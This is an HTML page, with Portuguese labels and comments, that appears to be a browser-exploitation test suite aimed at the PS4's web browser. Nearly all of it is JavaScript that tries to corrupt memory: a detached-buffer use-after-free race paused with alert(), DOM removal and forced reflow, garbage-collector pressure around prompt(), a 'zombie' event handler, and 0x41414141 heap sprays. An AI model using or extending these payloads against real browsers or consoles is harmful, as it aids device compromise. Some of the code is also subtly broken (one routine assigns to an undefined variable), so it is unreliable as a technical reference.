<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v480000: Modal Corruption</title>
<style>
    body { background: #100; color: #ff5; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #ff5; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #300; color: #fff; font-weight: bold;
    }
    .inst { font-size: 0.9em; color: #faa; margin-bottom: 15px; font-weight: bold; }
    
    button {
        display: block; width: 100%; padding: 20px; margin: 10px 0;
        background: #410; color: #fff; border: 2px solid #ff5;
        font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #ff5; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v480000: MODAL CORRUPTION</h1>

<div class="status" id="msg">
    FOCO: CORRUPÇÃO DE MEMÓRIA DURANTE A PAUSA JS<br>
    CLIQUE -> FULLSCREEN -> SIGA INSTRUÇÃO
</div>

<div class="inst">
    INSTRUÇÃO CRÍTICA: Quando a caixa aparecer, tente dar REFRESH (Atualizar) antes de clicar em OK. Se não conseguir, clique em OK rapidamente.
</div>

<button onclick="corrupt(c01)">01. Detached Buffer Race (UAF)</button>

<button onclick="corrupt(c02)">02. DOM Surgery & Reflow Freeze</button>

<button onclick="corrupt(c03)">03. Garbage Collector Panic Prompt</button>

<button onclick="corrupt(c04)">04. Event Handler Zombie Confirm</button>

<button onclick="corrupt(c05)">05. Prompt Heap Spray (Pointer Setup)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    const Msg = document.getElementById('msg');
    
    // Armazém global para manter memória ocupada ou sprays
    let heap_keep_alive = [];
    // Spray padrão "AAAA" para estabilizar crashes
    const spray_pattern = new Uint32Array(1024).fill(0x41414141);

    function corrupt(vectorFunc) {
        Stage.innerHTML = "";
        heap_keep_alive = [];
        
        // 1. Configura
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Execução com pequeno delay para garantir o fullscreen
        requestAnimationFrame(() => {
            setTimeout(() => {
                if(target._exec) target._exec();
            }, 300);
        });
    }

    // =================================================================
    // 01. Detached Buffer Race (UAF)
    // Tenta acessar um buffer de memória que foi "desanexado" (transferido
    // para um Worker) exatamente no momento que o alerta pausa a thread.
    // =================================================================
    function c01(stage) {
        const d = document.createElement('div');
        d.innerText = "BUFFER RACE";
        stage.appendChild(d);

        // Cria um worker para receber o buffer
        const blob = new Blob(["onmessage=function(e){ postMessage('done'); }"], {type:'text/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));
        
        // Cria o buffer vítima
        let buffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
        let view = new Uint8Array(buffer);
        view[0] = 1;

        d._exec = () => {
            Msg.innerText = ">>> TENTE DAR REFRESH COM O ALERTA ABERTO <<<";
            
            // O GOLPE:
            // 1. Transfere o buffer (ele fica inutilizável nesta thread)
            try { worker.postMessage(buffer, [buffer]); } catch(e){}
            
            // 2. PAUSA TUDO IMEDIATAMENTE
            window.alert("⚠️ BUFFER DETACHED ⚠️\nO JavaScript está pausado. A memória do buffer foi liberada.\nAo clicar OK, tentaremos ler essa memória morta.");
            
            // 3. A RETOMADA (Se o refresh não matar antes)
            // Tenta ler o buffer desanexado. Isso deve lançar erro ou crashar.
            try {
                const val = view[0]; // Acesso ilegal
                d.innerText = "Buffer Read: " + val; // Se chegar aqui, falhou
            } catch(e) {
                 d.innerText = "Read Error (Expected): " + e.message;
                 // Se deu erro JS, tentamos preencher o buraco
                 for(let i=0; i<100; i++) heap_keep_alive.push(new Uint32Array(spray_pattern));
            }
        };
        return d;
    }

    // =================================================================
    // 02. DOM Surgery & Reflow Freeze
    // Realiza uma mudança drástica no DOM e chama o alerta imediatamente,
    // pausando o motor de renderização no meio do cálculo de layout.
    // =================================================================
    function c02(stage) {
        const d = document.createElement('div');
        d.innerText = "DOM SURGERY";
        stage.appendChild(d);

        // Cria estrutura complexa
        const container = document.createElement('div');
        container.style.display = 'flex';
        for(let i=0; i<5000; i++) {
            const s = document.createElement('div');
            s.style.flex = '1'; s.innerText = i;
            container.appendChild(s);
        }
        document.body.appendChild(container);

        d._exec = () => {
            Msg.innerText = ">>> LAYOUT CONGELADO <<<";
            
            // O GOLPE:
            // 1. Destrói a estrutura complexa (invalida o layout)
            container.remove();
            
            // 2. PAUSA TUDO (O motor de renderização fica com referências pendentes)
            window.alert("⚠️ DOM DESTROYED ⚠️\nO motor de layout foi interrompido.");
            
            // 3. A RETOMADA: Força um recálculo de layout síncrono
            // Se o motor não limpou as referências antigas durante a pausa, crash.
            const forceReflow = document.body.offsetWidth;
            document.body.innerHTML = "REFLOW COMPLETE: " + forceReflow;
        };
        return d;
    }

    // =================================================================
    // 03. Garbage Collector Panic Prompt
    // Cria pressão massiva de memória e usa o 'prompt' para pausar.
    // Esperamos que o GC rode agressivamente durante a pausa e cometa um erro.
    // =================================================================
    function c03(stage) {
        const d = document.createElement('div');
        d.innerText = "GC PANIC";
        stage.appendChild(d);

        d._exec = () => {
            let count = 0;
            function loop() {
                count++;
                Msg.innerText = "CICLO GC: " + count;
                
                // Aloca 50MB de lixo temporário
                let junk_pile = [];
                for(let i=0; i<50; i++) junk_pile.push(new Uint8Array(1024*1024));
                
                // Objeto vítima que queremos que o GC colete incorretamente
                let victim = { id: count, vital_data: new Array(100).fill(1.1) };
                
                // Libera a referência para o lixo e a vítima
                junk_pile = null;
                // victim = null; // Mantenha comentado para testar pressão, descomente para UAF direto

                // PAUSA: O Prompt segura a execução. O GC pode rodar aqui.
                const input = window.prompt("⚠️ PRESSÃO DE MEMÓRIA MÁXIMA ⚠️\nCiclo " + count + ".\nClique OK rápido ou tente Refresh.", "Aguardando GC...");
                
                // A RETOMADA: Tenta acessar a vítima.
                if(victim && victim.vital_data[0] !== 1.1) {
                     // Se o valor mudou, houve corrupção!
                     document.body.innerHTML = "<h1>CORRUPTION DETECTED!</h1>";
                     return; // Para o loop
                }

                if(count < 10) setTimeout(loop, 100);
            }
            loop();
        };
        return d;
    }

    // =================================================================
    // 04. Event Handler Zombie Confirm
    // Cria um botão, clica nele via script, e dentro do evento do clique
    // destrói o botão e abre um 'confirm'. O handler tenta continuar depois.
    // =================================================================
    function c04(stage) {
        const btn = document.createElement('button');
        btn.innerText = "CLIQUE-ME (ZUMBI)";
        stage.appendChild(btn);

        btn.onclick = function() {
            // 1. Destrói o próprio elemento que gerou o evento
            btn.remove();
            
            // 2. PAUSA (O contexto de execução do evento fica suspenso)
            const result = window.confirm("⚠️ O BOTÃO FOI DESTRUÍDO ⚠️\nO manipulador de evento ainda está rodando.\nClique OK para continuar.");
            
            // 3. A RETOMADA: Tenta acessar propriedades do elemento morto
            try {
                // Acesso a 'this' (que era o btn)
                const text = this.innerText;
                console.log(text);
                // Spray para tentar pegar a memória liberada
                for(let i=0; i<1000; i++) heap_keep_alive.push(new Uint32Array(spray_pattern));
            } catch(e) {
                document.body.innerText = "Erro JS (Normal): " + e.message;
            }
        };

        d._exec = () => {
            Msg.innerText = ">>> DISPARANDO EVENTO ZUMBI <<<";
            setTimeout(() => {
                btn.click(); // Dispara o evento programaticamente
            }, 500);
        };
        return btn;
    }

    // =================================================================
    // 05. Prompt Heap Spray (Pointer Setup)
    // Usa a caixa de input do 'prompt' para injetar strings específicas
    // na memória. Isso não crasha sozinho, mas prepara o terreno.
    // =================================================================
    function c05(stage) {
        const d = document.createElement('div');
        d.innerText = "HEAP SPRAY PROMPT";
        stage.appendChild(d);

        // Cria uma string gigante que representa ponteiros falsos (AAAA...)
        // 0x41 é 'A'. Usamos unescape para criar a string binária crua.
        let payload = "";
        for(let i=0; i<2000; i++) payload += unescape("%u4141%u4141");

        d._exec = () => {
            Msg.innerText = ">>> INJETANDO PONTEIROS FALSOS <<<";
            
            // Abre o prompt repetidamente com o valor padrão sendo nosso payload
            // Cada vez que o prompt abre, o navegador aloca essa string na memória.
            for(let i=0; i<5; i++) {
                window.prompt("INJEÇÃO DE HEAP #" + (i+1) + "\nNão digite nada, apenas clique OK.", payload);
                // Mantém referência para não ser coletado pelo GC
                heap_keep_alive.push(payload.substr(0, payload.length)); 
            }
            d.innerText = "Spray completo. Memória preparada.";
        };
        return d;
    }

</script>
</body>
</html>
